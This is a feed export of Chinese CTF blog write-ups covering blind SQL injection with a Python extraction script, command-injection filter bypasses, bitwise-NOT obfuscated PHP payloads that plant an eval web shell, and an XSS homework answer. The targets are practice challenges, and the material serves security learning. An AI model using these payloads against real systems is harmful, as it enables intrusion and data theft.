    <content type="html"><![CDATA[<h3 id="WUSTCTF2020-颜值成绩查询"><a href="#WUSTCTF2020-颜值成绩查询" class="headerlink" title="[WUSTCTF2020]颜值成绩查询"></a>[WUSTCTF2020]颜值成绩查询</h3><p>进入题目是一个查询，联想到之前做的题：</p><p><img src="/images/WUSTCTF2020-颜值成绩查询/image-20210416174013260.png" alt="image-20210416174013260" style="zoom:67%;" /><img src="/images/WUSTCTF2020-%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2/image-20210416174029609.png" alt="image-20210416174029609"></p><img src="/images/WUSTCTF2020-颜值成绩查询/image-20210416174029609.png" alt="image-20210416174029609" style="zoom:67%;" /><p>这里就是一个数值型的注入，奇怪的是，啥都没过滤，直接盲注：</p><p>?stunum=if(ord(substr(database(),0,1))&gt;=0,1,0)%23</p><img src="/images/WUSTCTF2020-颜值成绩查询/image-20210416174225317.png" alt="image-20210416174225317" style="zoom:80%;" /><p>?stunum=if(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0,1))&gt;=0,1,0)%23</p><img src="/images/WUSTCTF2020-颜值成绩查询/image-20210416174243563.png" alt="image-20210416174243563" style="zoom:80%;" /><p>表：</p><img src="/images/WUSTCTF2020-颜值成绩查询/image-20210416174303651.png" alt="image-20210416174303651" style="zoom:80%;" /><p>flag在value列中：</p><img src="/images/WUSTCTF2020-颜值成绩查询/image-20210416174324714.png" alt="image-20210416174324714" style="zoom:80%;" /><p>脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> x in range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    l = <span class="number">32</span></span><br><span class="line">    r = <span class="number">126</span></span><br><span class="line">    <span class="keyword">while</span> r &gt; l:</span><br><span class="line">        mid = <span class="keyword">int</span>((l + r + <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">        x = str(x)</span><br><span class="line">        y = str(mid)</span><br><span class="line">        url = <span class="string">&#x27;http://ae264edd-9cc0-4005-8193-2fe2294f2118.node3.buuoj.cn/?stunum=if(ord(substr((select(value)from(flag)),&#x27;</span>+x+<span class="string">&#x27;,1))&gt;=&#x27;</span>+y+<span class="string">&#x27;,1,0)#&#x27;</span></span><br><span class="line">        response = requests.get(url=url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;admin&quot;</span> in response.text:</span><br><span class="line">            l = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = mid - <span class="number">1</span></span><br><span class="line">        time.sleep(<span class="number">0.03</span>)</span><br><span class="line">    flag += (chr(<span class="keyword">int</span>(r)))</span><br><span class="line">    <span class="keyword">print</span>(chr(<span class="keyword">int</span>(r)))</span><br><span class="line">    <span class="keyword">print</span>(flag)</span><br><span class="line"><span class="keyword">print</span>(flag)</span><br></pre></td></tr></table></figure><p>（最近没怎么做sql注入的题，手有点生……</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;WUSTCTF2020-颜值成绩查询&quot;&gt;&lt;a href=&quot;#WUSTCTF2020-颜值成绩查询&quot; class=&quot;headerlink&quot; title=&quot;[WUSTCTF2020]颜值成绩查询&quot;&gt;&lt;/a&gt;[WUSTCTF2020]颜值成绩查询&lt;/h3&gt;&lt;p&gt;进入题目</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>EasyBypass</title>
    <link href="http://example.com/2021/04/15/EasyBypass/"/>
    <id>http://example.com/2021/04/15/EasyBypass/</id>
    <published>2021-04-15T10:19:52.000Z</published>
    <updated>2021-04-15T10:29:10.754Z</updated>
    
    <content type="html"><![CDATA[<h3 id="EasyBypass"><a href="#EasyBypass" class="headerlink" title="EasyBypass"></a>EasyBypass</h3><p>buu新上题，想必不久之后就会成一分题了……</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">$comm1 = $_GET[<span class="string">&#x27;comm1&#x27;</span>];</span><br><span class="line">$comm2 = $_GET[<span class="string">&#x27;comm2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&#x27;|\`|\\|\*|\n|\t|\xA0|\r|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;</span>, $comm1))</span><br><span class="line">    $comm1 = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&#x27;|\&quot;|;|,|\`|\*|\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||ls|\||tail|more|cat|string|bin|less||tac|sh|flag|find|grep|echo|w/is&quot;</span>, $comm2))</span><br><span class="line">    $comm2 = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">$flag = <span class="string">&quot;#flag in /flag&quot;</span>;</span><br><span class="line"></span><br><span class="line">$comm1 = <span class="string">&#x27;&quot;&#x27;</span> . $comm1 . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">$comm2 = <span class="string">&#x27;&quot;&#x27;</span> . $comm2 . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">$cmd = <span class="string">&quot;file <span class="subst">$comm1</span> <span class="subst">$comm2</span>&quot;</span>;</span><br><span class="line">system($cmd);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>过滤绕过rce</p><p>一番尝试发现，comm2的过滤比comm1严格的多，那就只用comm1，闭合后面的引号即可执行命令</p><p>读取flag的时候发现flag也有过滤，然而f\lag就行了……</p><p><code>/?comm1=-f&quot; &quot;/etc/hosts</code></p><p><img src="/images/EasyBypass/image-20210415182443139.png" alt="image-20210415182443139"></p><p><code>?comm1=-f&quot; /fla\g;od /fla\g;&quot;</code></p><p><img src="/images/EasyBypass/image-20210415182547134.png" alt="image-20210415182547134"></p><p>od倒是可以用……</p><p>拼接亦可：<code>?comm1=-f&quot; ;a=ca;b=t;c=g;$a$b /fla$c;&quot;</code></p><p><img src="/images/EasyBypass/image-20210415182901338.png" alt="image-20210415182901338"></p><p>方法挺多……</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;EasyBypass&quot;&gt;&lt;a href=&quot;#EasyBypass&quot; class=&quot;headerlink&quot; title=&quot;EasyBypass&quot;&gt;&lt;/a&gt;EasyBypass&lt;/h3&gt;&lt;p&gt;buu新上题，想必不久之后就会成一分题了……&lt;/p&gt;
&lt;figure cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>极客大挑战-2019-RCE-ME</title>
    <link href="http://example.com/2021/04/15/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME/"/>
    <id>http://example.com/2021/04/15/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME/</id>
    <published>2021-04-15T06:56:32.000Z</published>
    <updated>2021-04-16T08:54:30.100Z</updated>
    
    <content type="html"><![CDATA[<h3 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">  $code=$_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(strlen($code)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;This is too Long.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,$code))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>这个题目算是熟悉了吧，常用的取反操作，php写了个取反页面：</p><img src="/images/极客大挑战-2019-RCE-ME/image-20210415145937889.png" alt="image-20210415145937889" style="zoom:80%;" /><p>结合之前的经验，这次我想试试scandir函数，熟悉熟悉：</p><blockquote><p>(<del>%8F%8D%96%91%8B%A0%8D)((</del>%8C%9C%9E%91%9B%96%8D)(“.”));</p></blockquote><p>即(print_r)((scandir)(“.”))注意括号的包裹，这是解释取反的关键</p><p><img src="/images/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME/image-20210415150328993.png" alt="image-20210415150328993"></p><p>cat flag倒也是一个问题……</p><blockquote><p>(<del>%8C%97%90%88%A0%8C%90%8A%8D%9C%9A)(</del>%D1%D1%D0%D1%D1%D0%D1%D1%D0%99%93%9E%98)();</p></blockquote><p>用show_source读取文件，一直读不出来……本地是可以的……ant：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?code=(~%<span class="number">9</span>E%<span class="number">8</span>C%<span class="number">8</span>C%<span class="number">9</span>A%<span class="number">8</span>D%<span class="number">8</span>B)(~%D7%<span class="number">9</span>A%<span class="number">89</span>%<span class="number">9</span>E%<span class="number">93</span>%D7%DB%A0%AF%B0%AC%AB%A4%CE%CD%CC%A2%D6%D6);</span><br><span class="line"><span class="comment">//(asert)((eval($_POST[123])))</span></span><br></pre></td></tr></table></figure><img src="/images/极客大挑战-2019-RCE-ME/image-20210415154109978.png" alt="image-20210415154109978" style="zoom:50%;" /><p>本来就是空文件……然后有一个readflag，不知道是干啥的……</p><p>学一手wp……学到了一些操作</p><blockquote><p>assert(next(getallheaders()))</p><p>next() 函数将内部指针指向数组中的下一个元素，并输出。</p><p>getallheaders — 获取全部 HTTP 请求头信息，作为一个数组储存。</p></blockquote><img src="/images/极客大挑战-2019-RCE-ME/image-20210415160349677.png" alt="image-20210415160349677" style="zoom:80%;" /><p>这里就可以借助head头信息去rce，本来我想尝试用phpsessid的，但没成功……</p><p>然后是一个劫持共享so……啊，看不懂，看懂这个我需要学啥，啊吧啊吧……</p><p>蚁剑有一个绕过disable_functions的插件，有PHP7的UAF…………我爬去学了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;极客大挑战-2019-RCE-ME&quot;&gt;&lt;a href=&quot;#极客大挑战-2019-RCE-ME&quot; class=&quot;headerlink&quot; title=&quot;[极客大挑战 2019]RCE ME&quot;&gt;&lt;/a&gt;[极客大挑战 2019]RCE ME&lt;/h3&gt;&lt;figure cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>hacker101.0</title>
    <link href="http://example.com/2021/04/13/hacker101-0/"/>
    <id>http://example.com/2021/04/13/hacker101-0/</id>
    <published>2021-04-13T07:15:15.000Z</published>
    <updated>2021-04-13T09:19:36.132Z</updated>
    
    <content type="html"><![CDATA[<h5 id="hacker101-0"><a href="#hacker101-0" class="headerlink" title="hacker101.0"></a>hacker101.0</h5><p><a href="https://www.bilibili.com/video/av75418689/">https://www.bilibili.com/video/av75418689/</a></p><p>1.本视频一开始介绍了哪两个工具，他们的作用分别是什么？为什么作者会推荐firefox，它的优点是什么？（5分）</p><blockquote><p>Bure Proxy &amp; Firefox</p><p>Bure Proxy可以对HTTP和HTTPS的流量包进行监控和修改，是业内流行工具。</p><p>Firefox在做请求处理时，可以通过它轻松实现浏览器的代理设置，而无需对系统做其他的设置。设置后，它捕获的即是我们所关心的web应用流量而非系统的其他流量。Firefox还包括了一些开发调试的工具，可以方便的查看修改cookie信息，检查DOM……这就是为什么作者推荐Firefox。当然，也可以用Chrome和Burp一起配合工作。</p></blockquote><p>2.本视频中体现了哪些攻防上的哲学观点？作者希望你养成什么样的思维？这些思维在帮助你挖掘漏洞的时候有什么帮助？结合你的经历与视频内容谈谈你的看法。（10分）</p><blockquote><p>我们应当站在attacker的角度来思考问题，而不是defender。应该了解攻击者对攻击目标的攻击套路和攻击思维。对一些测试的应用程序来说，了解他的最好方法是大胆点击它的每个功能按钮来加深对他的功能认识并发现它的功能弱点。</p><p>作者还强调，攻防双方在安全职责任务上存在一种不平衡。通常对于防护者来说，必须去发现系统中所有存在的漏洞；对于攻击者，只需发现少量或一个漏洞即可。攻击者比防护者明显更具优势。实战可能方法很简单，但是不可能发现的了所有漏洞。精力是有限的，我们必须有轻重缓急之分，尤其要学会识别一些高风险漏洞问题，最大化降低攻击影响或一些可能的情况。换位思考评估攻击者最想获得什么东西，这是重要的安全技能培养方法。</p><p>对每个功能点进行熟悉并为之可能产生的漏洞分类与评级，考虑不同功能点的综合利用，这有助于理清逻辑并尽可能先发现更加危险的漏洞。</p></blockquote><p>3.审计以下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[ <span class="string">&#x27; name &#x27;</span> ]))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;Hello <span class="subst">&#123;$_GET[&#x27;name&#x27;]&#125;</span> !&lt;/h1&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;form method=<span class="string">&quot;GET&quot;</span>&gt;</span><br><span class="line">Enter your name: &lt;input type=<span class="string">&quot;input&quot;</span> name=<span class="string">&quot;name&quot;</span>&gt;&lt;br&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot; submit&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>本段代码涉及到客户端，服务端以及通信协议。运行在客户端的代码主要有HTML以及javascript，由浏览器核心负责解释 通信协议为HTTP协议，有多种格式的请求包，常见的为POST与GET 运行在服务端的代码为php，由php核心负责解释。 用户端与服务端通过HTTP通信协议进行交互。 </p><ul><li><p>那么，以上代码中，哪些部分属于客户端的内容，哪些属于服务端的内容？（1分） </p></li><li><p>客户端是通过传递什么参数来控制服务端代码的？（1分） </p></li><li><p>客户端通过控制该参数会对服务端造成什么影响，继而使得客户端本身收到影响，从而造成了什么漏洞？如果是xss漏洞，具体又是什么类型的xss漏洞，为什么？（3分）</p></li></ul><blockquote><p>​        <a href="https://blog.csdn.net/wang404838334/article/details/78449149">https://blog.csdn.net/wang404838334/article/details/78449149</a>                                             </p><p>服务器web：我们把提供（响应）服务的计算机称作服务器（Server），也叫服务器端。               </p><p>客户端web：接受（请求）服务的计算机称作客户机（Client），也叫客户端。                                                     </p><p>①当用户在浏览器地址中输入要访问的PHP页面文件名，然后回车就会触发这个PHP请求，并将请求传送化支持PHP的WEB服务器。                                                                                        ②WEB服务器接受这个请求，并根据其后缀进行判断如果是一个PHP请求，WEB服务器从硬盘或内存中取出用户要访问的PHP应用程序，并将其发送给PHP引擎程序。                                                                                                                                                                                   ③PHP引擎程序将会对WEB服务器传送过来的文件从头到尾进行扫描并根据命令从后台读取，处理数据，并动态地生成相应的HTML页面。                                                                                                                                                                                                                                    ④PHP引擎将生成HTML页面返回给WEB服务器（apache）。WEB服务器再将HTML页面返回给客户端浏览器，最后一个完整的页面基于通过浏览器展现在我们眼前。                        这里内嵌的php语句应当是服务端的内容，而html的渲染是属于客户端浏览器上渲染的。                                                                                                                                                                                                                                         客户端在html显示的表单通过get提交了一个name参数，服务端识别这个以get方法提交的参数，在<code>echo &quot;&lt;h1&gt;Hello &#123;$_GET[&#39;name&#39;]&#125; !&lt;/h1&gt;&quot;;</code>中hello后的值被控制。</p><p>​        这段参数没有进行任何的过滤，使得hello后的html字段可以由客户端任意控制，形成xss漏洞。由于内容只与用户提交的参数有关，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），故为反射型xss漏洞。</p></blockquote><p>4.思考：现实中如何利用xss漏洞实施攻击，我们应该如何预防？（1分）</p><blockquote><p>现实中实施攻击……关键在于参数的隐藏，可以进行url编码；如果还是可疑，可以利用网页上的网址缩短工具或绑定到一个看起来正常的网址……大概？攻击的投放可以通过邮件、广告、借助评论或图片上传链接、钓鱼网站……（都没实战过</p><p>预防……可以通过严格的过滤和应用CSP来阻止xss的产生，HttpOnly好像可以防止cookie窃取……</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;hacker101-0&quot;&gt;&lt;a href=&quot;#hacker101-0&quot; class=&quot;headerlink&quot; title=&quot;hacker101.0&quot;&gt;&lt;/a&gt;hacker101.0&lt;/h5&gt;&lt;p&gt;&lt;a href=&quot;https://www.bilibili.com/</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>WUSTCTF2020-朴实无华</title>
    <link href="http://example.com/2021/04/12/WUSTCTF2020-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/"/>
    <id>http://example.com/2021/04/12/WUSTCTF2020-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/</id>
    <published>2021-04-11T16:00:39.000Z</published>
    <updated>2021-04-11T16:19:00.899Z</updated>
    
    <content type="html"><![CDATA[<h3 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h3><p>这个题的各种编码还是挺烦人的……</p><img src="/images/WUSTCTF2020-朴实无华/image-20210412000152394.png" alt="image-20210412000152394" style="zoom:80%;" /><p>robots.php里有：/fAke_f1agggg.php，结果确实fake……</p><p>抓包发现：</p><p><img src="/images/WUSTCTF2020-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/image-20210412000414721.png" alt="image-20210412000414721"></p><p>访问：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(intval($num) &lt; <span class="number">2020</span> &amp;&amp; intval($num + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;金钱解决不了穷人的本质问题&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;md5&#x27;</span>]))&#123;</span><br><span class="line">   $md5=$_GET[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span> ($md5==md5($md5))</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;get_flag&#x27;</span>]))&#123;</span><br><span class="line">    $get_flag = $_GET[<span class="string">&#x27;get_flag&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!strstr($get_flag,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;wctf2020&quot;</span>, $get_flag);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;</span>;</span><br><span class="line">        system($get_flag);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;快到非洲了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>bypass</p><p>第一点的intval的绕过好像也和版本有关，新版本似乎是支持科学计数法的（有一次疯狂思考绕过……</p><p>这里传入2e4即可绕过</p><p>level2：<code>$md5==md5($md5)</code>弱比较，其实也就是0e开头的md5值md5后仍是0e开头+数字的字符串</p><p>写了一个垃圾脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="string">&#x27;1234567890&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> <span class="string">&#x27;1234567890&#x27;</span>:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&#x27;1234567890&#x27;</span>:</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> <span class="string">&#x27;1234567890&#x27;</span>:</span><br><span class="line">                <span class="keyword">for</span> e <span class="keyword">in</span> <span class="string">&#x27;1234567890&#x27;</span>:</span><br><span class="line">                    <span class="keyword">for</span> f <span class="keyword">in</span> <span class="string">&#x27;1234567890&#x27;</span>:</span><br><span class="line">                        <span class="keyword">for</span> g <span class="keyword">in</span> <span class="string">&#x27;1234567890&#x27;</span>:</span><br><span class="line">                            <span class="keyword">for</span> h <span class="keyword">in</span> <span class="string">&#x27;1234567890&#x27;</span>:</span><br><span class="line">                                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;1234567890&#x27;</span>:</span><br><span class="line">                                    j=<span class="string">f&quot;0e<span class="subst">&#123;a&#125;</span><span class="subst">&#123;b&#125;</span><span class="subst">&#123;c&#125;</span><span class="subst">&#123;d&#125;</span><span class="subst">&#123;e&#125;</span><span class="subst">&#123;f&#125;</span><span class="subst">&#123;g&#125;</span><span class="subst">&#123;h&#125;</span><span class="subst">&#123;i&#125;</span>&quot;</span></span><br><span class="line">                                    p=md5(j.encode(<span class="string">&#x27;utf8&#x27;</span>)).hexdigest()</span><br><span class="line">                                    <span class="keyword">if</span> p[<span class="number">0</span>:<span class="number">2</span>]==<span class="string">&#x27;0e&#x27;</span>:</span><br><span class="line">                                        pp = p[<span class="number">2</span>:<span class="number">32</span>]</span><br><span class="line">                                        <span class="keyword">if</span> re.match(<span class="string">&quot;\d&#123;30,30&#125;&quot;</span>,pp):</span><br><span class="line">                                            print(j)</span><br><span class="line">                                            print(p)</span><br><span class="line">                                            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>超级暴力循环……</p><p>最后找到三对：</p><blockquote><p>0e215962017<br>0e291242476940776845150308577824<br>0e730083352<br>0e870635875304277170259950255928<br>0e807097110<br>0e318093639164485566453180786895</p></blockquote><p>level3：</p><p>干掉了空格和cat，但读取的方法有很多，空格也有绕过方法：</p><blockquote><p>这里解释一下${IFS},$IFS,$IFS$9的区别，首先$IFS在linux下表示分隔符，然而我本地实验却会发生这种情况，这里解释一下,单纯的cat$IFS2,bash解释器会把整个IFS2当做变量名，所以导致输不出来结果，然而如果加一个{}就固定了变量名，同理在后面加个$可以起到截断的作用，但是为什么要用$9呢，因为$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串</p></blockquote><p>这里大于号或小于号也是可以绕过的……</p><p>读取就很容易了</p><p>getflag！</p><p>……</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;WUSTCTF2020-朴实无华&quot;&gt;&lt;a href=&quot;#WUSTCTF2020-朴实无华&quot; class=&quot;headerlink&quot; title=&quot;[WUSTCTF2020]朴实无华&quot;&gt;&lt;/a&gt;[WUSTCTF2020]朴实无华&lt;/h3&gt;&lt;p&gt;这个题的各种编码还是挺烦</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>2021angstromCTF-nomnomnom</title>
    <link href="http://example.com/2021/04/11/2021angstromCTF-nomnomnom/"/>
    <id>http://example.com/2021/04/11/2021angstromCTF-nomnomnom/</id>
    <published>2021-04-11T14:00:55.000Z</published>
    <updated>2021-04-11T15:57:12.100Z</updated>
    
